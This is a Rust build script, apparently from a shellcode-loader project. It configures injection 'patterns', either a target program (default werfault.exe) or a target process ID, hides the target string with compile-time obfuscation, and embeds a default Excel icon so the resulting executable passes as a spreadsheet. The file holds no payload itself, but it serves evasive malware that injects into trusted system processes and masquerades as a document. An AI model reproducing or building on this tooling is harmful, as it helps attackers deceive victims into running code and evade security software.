extern crate embed_resource;
include!("src/thunk.rs");

use std::fs;

fn main() {
    // 告诉 Cargo 跟踪环境变量的变化
    println!("cargo:rerun-if-env-changed=CARGO_FEATURE_WIN7");
    println!("cargo:rerun-if-env-changed=CARGO_FEATURE_PATTERN1");
    println!("cargo:rerun-if-env-changed=CARGO_FEATURE_PATTERN2");
    println!("cargo:rerun-if-env-changed=CARGO_FEATURE_PATTERN3");
    println!("cargo:rerun-if-env-changed=RSL_TARGET_PROGRAM");
    println!("cargo:rerun-if-env-changed=RSL_TARGET_PID");
    println!("cargo:rerun-if-env-changed=RSL_ICON_PATH");
    
    // 检查 CARGO_FEATURE_WIN7 环境变量，如果存在则启用 Win7 兼容
    if std::env::var("CARGO_FEATURE_WIN7").is_ok() {
        println!("cargo:note=Win7 兼容已启用，执行 thunk");
        thunk();
    }
    
    // 生成 target.rs 根据pattern feature
    generate_target_rs();
    
    // 生成 icon.rc
    generate_icon_rc();
    
    embed_resource::compile("icon.rc");
}

fn generate_target_rs() {
    let target_path = std::path::Path::new("src/target.rs");

    if env::var("CARGO_FEATURE_PATTERN2").is_ok() {
        let target_program = env::var("RSL_TARGET_PROGRAM")
            .unwrap_or_else(|_| r"C:\Windows\System32\werfault.exe".to_string());
        let content = format!(
            r#"use rustcrypt_ct_macros::{{obf_lit_bytes}};
use std::sync::LazyLock;

pub static TARGET_PROGRAM: LazyLock<Vec<u8>> = LazyLock::new(|| obf_lit_bytes!(br"{}"));
"#,
            target_program
        );
        fs::write(target_path, content).expect("Failed to write target.rs");
        println!("cargo:note=Generated target.rs with TARGET_PROGRAM: {}", target_program);
    } else if env::var("CARGO_FEATURE_PATTERN3").is_ok() {
        let target_pid = env::var("RSL_TARGET_PID")
            .unwrap_or_else(|_| "0".to_string());
        let content = format!(
            r#"pub const TARGET_PID: u32 = {};
"#,
            target_pid
        );
        fs::write(target_path, content).expect("Failed to write target.rs");
        println!("cargo:note=Generated target.rs with TARGET_PID: {}", target_pid);
    } else {
        // pattern 1 or no pattern, remove target.rs if exists
        if target_path.exists() {
            fs::remove_file(target_path).expect("Failed to remove target.rs");
        }
        println!("cargo:note=No need to generate target.rs for pattern1 or no pattern");
    }
}

fn generate_icon_rc() {
    let icon_path = env::var("RSL_ICON_PATH")
        .unwrap_or_else(|_| "icons/excel.ico".to_string());
    
    // 将反斜杠替换为正斜杠，以适应RC文件格式
    let icon_path_normalized = icon_path.replace("\\", "/");
    
    let content = format!(r#"iconName ICON "{}""#, icon_path_normalized);
    
    fs::write("icon.rc", content).expect("Failed to write icon.rc");
    println!("cargo:note=Generated icon.rc with icon: {}", icon_path);
}